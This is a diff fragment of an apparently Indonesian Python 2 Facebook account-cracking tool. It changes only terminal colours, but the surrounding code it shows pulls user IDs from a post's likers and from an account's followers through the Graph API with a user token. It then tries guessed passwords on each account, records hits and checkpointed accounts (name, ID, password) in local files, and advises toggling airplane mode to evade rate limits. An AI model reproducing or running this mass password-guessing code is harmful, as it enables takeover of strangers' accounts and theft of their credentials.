-                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos1
+                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos1
                 cek = open('done/pakis.txt', 'a')
                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
@@ -1256,10 +1256,10 @@ def pilih_pakis():
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
-                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
-                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos2
+                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos2
                     cek = open('done/pakis.txt', 'a')
                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
@@ -1278,10 +1278,10 @@ def pilih_pakis():
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
-                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
-                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos3
+                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos3
                         cek = open('done/pakis.txt', 'a')
                         cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
@@ -1300,10 +1300,10 @@ def pilih_pakis():
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
-                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
-                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos4
+                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos4
                             cek = open('done/pakis.txt', 'a')
                             cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
@@ -1322,10 +1322,10 @@ def pilih_pakis():
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
-                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
-                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos5
+                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos5
                                 cek = open('done/pakis.txt', 'a')
                                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
@@ -1344,10 +1344,10 @@ def pilih_pakis():
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
-                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos6
+                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos6
                                     cek = open('done/pakis.txt', 'a')
                                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
@@ -1366,10 +1366,10 @@ def pilih_pakis():
                                         oke.close()
                                         oks.append(zowe)
                                     elif 'www.facebook.com' in ko['error_msg']:
-                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;91mCEKPOINT'
-                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
-                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos7
+                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos7
                                         cek = open('done/pakis.txt', 'a')
                                         cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos7 + '\n')
                                         cek.close()
@@ -1389,9 +1389,9 @@ def pilih_pakis():
                                             oks.append(zowe)
                                         elif 'www.facebook.com' in ko['error_msg']:
                                             print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
-                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;91m' + j['name']
-                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;91m' + zowe
-                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;91m' + bos8
+                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos8
                                             cek = open('done/pakis.txt', 'a')
                                             cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos8 + '\n')
                                             cek.close()
@@ -1426,27 +1426,27 @@ def crack_likes():
         print 50 * '\x1b[1;94m\xe2\x94\x80'
         print '        \x1b[1;96m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK POSTINGAN GRUP/TEMAN\x1b[1;96m \xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
         print 50 * '\x1b[1;94m\xe2\x94\x80'
-        tez = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;96m ID Postingan Group/Teman \x1b[1;91m :\x1b[1;92m ')
+        tez = raw_input('\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m}\x1b[1;97m ID Postingan Group/Teman \x1b[1;91m :\x1b[1;93m ')
         r = requests.get('https://graph.facebook.com/' + tez + '/likes?limit=9999999&access_token=' + toket)
         z = json.loads(r.text)
         for i in z['data']:
             id.append(i['id'])
 
-        jalan('\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mMengambil ID \x1b[1;97m...')
+        jalan('\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mMengambil ID \x1b[1;97m...')
     except KeyError:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID Postingan Salah !'
+        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} ID Postingan Salah !'
         raw_input('\n\x1b[1;96m[<\x1b[1;97mKembali>\x1b[1;96m]')
         menu()
 
-    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mStop Tekan CTRL+Z'
+    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
+    print '\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mStop Tekan CTRL+Z'
     titik = ['.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mCrack Berjalan ' + o,
+        print '\r\x1b[1;97m{\x1b[1;96m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mCrack Berjalan ' + o,
         sys.stdout.flush()
         time.sleep(1)
 
-    print '\n\x1b[1;97m\x1b[1;96m\x1b[1;97m\x1b[1;96mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
+    print '\n\x1b[1;97m\x1b[1;96m\x1b[1;97m\x1b[1;97mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
     print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
 
     def main(arg):
@@ -1474,10 +1474,10 @@ def crack_likes():
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos1
+                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos1
                 cek = open('done/grup.txt', 'a')
                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos1 + '\n')
                 cek.close()
@@ -1496,10 +1496,10 @@ def crack_likes():
                     oke.close()
                     oks.append(zowe)
                 elif 'www.facebook.com' in ko['error_msg']:
-                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos2
+                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos2
                     cek = open('done/grup.txt', 'a')
                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos2 + '\n')
                     cek.close()
@@ -1518,10 +1518,10 @@ def crack_likes():
                         oke.close()
                         oks.append(zowe)
                     elif 'www.facebook.com' in ko['error_msg']:
-                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos3
+                        print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                        print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos3
                         cek = open('done/grup.txt', 'a')
                         cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos3 + '\n')
                         cek.close()
@@ -1540,10 +1540,10 @@ def crack_likes():
                             oke.close()
                             oks.append(zowe)
                         elif 'www.facebook.com' in ko['error_msg']:
-                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos4
+                            print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                            print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos4
                             cek = open('done/grup.txt', 'a')
                             cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos4 + '\n')
                             cek.close()
@@ -1562,10 +1562,10 @@ def crack_likes():
                                 oke.close()
                                 oks.append(zowe)
                             elif 'www.facebook.com' in ko['error_msg']:
-                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos5
+                                print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos5
                                 cek = open('done/grup.txt', 'a')
                                 cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos5 + '\n')
                                 cek.close()
@@ -1584,10 +1584,10 @@ def crack_likes():
                                     oke.close()
                                     oks.append(zowe)
                                 elif 'www.facebook.com' in ko['error_msg']:
-                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;96mCEKPOINT'
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;96m' + j['name']
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;96m' + zowe
-                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;96m' + bos6
+                                    print '\n\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
+                                    print '\x1b[1;97m{\x1b[1;96m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;93m' + bos6
                                     cek = open('done/grup.txt', 'a')
                                     cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     : ' + j['name'] + '\n{\xc3\x97} ID     : ' + zowe + '\n{\xc3\x97} Pw Fb : ' + bos6 + '\n')
                                     cek.close()
@@ -1613,17 +1613,17 @@ def crack_follow():
     print 50 * '\x1b[1;94m\xe2\x94\x80'
     print '              \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK FOLLOWERS \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
     print 50 * '\x1b[1;94m\xe2\x94\x80'
-    idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Publik/Teman \x1b[1;91m:\x1b[1;92m ')
+    idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mID Publik/Teman \x1b[1;91m:\x1b[1;93m ')
     try:
         jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
         op = json.loads(jok.text)
-        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
+        print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mNama \x1b[1;91m:\x1b[1;93m ' + op['name']
     except KeyError:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik/teman tidak ada !'
+        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} ID publik/teman tidak ada !'
         raw_input('\n\x1b[1;95m[\x1b[1;97m<Kembali>\x1b[1;95m]')
         menu()
     except requests.exceptions.ConnectionError:
-        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
+        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;91m} Tidak ada koneksi !'
         keluar()
 
     r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
@@ -1631,15 +1631,15 @@ def crack_follow():
     for i in z['data']:
         id.append(i['id'])
 
-    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID Followers \x1b[1;91m:\x1b[1;92m ' + str(len(id))
-    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Tekan CTRL+Z'
+    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;97mTotal ID Followers \x1b[1;91m:\x1b[1;92m ' + str(len(id))
+    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;96mStop Tekan CTRL+Z'
     titik = ['.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCrack Berjalan ' + o,
+        print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mCrack Berjalan ' + o,
         sys.stdout.flush()
         time.sleep(1)
 
-    print '\n\x1b[1;97m\x1b[1;95m\x1b[1;97m\x1b[1;95mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
+    print '\n\x1b[1;97m\x1b[1;95m\x1b[1;97m\x1b[1;97mGunakan Mode Pesawat 2 Detik Jika Tidak Ada Hasil'
     print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
 
     def main(arg):
@@ -1667,10 +1667,10 @@ def crack_follow():
                 oke.close()
                 oks.append(zowe)
             elif 'www.facebook.com' in ko['error_msg']:
-                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;95m' + j['name']
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;95m' + zowe
-                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Pw Fb  \x1b[1;91m: \x1b[1;95m' + bos1
+                print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    : \x1b[1;93m' + j['name']
+                print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} ID  \x1b[1;91m    : \x1b[1;93m' + zowe
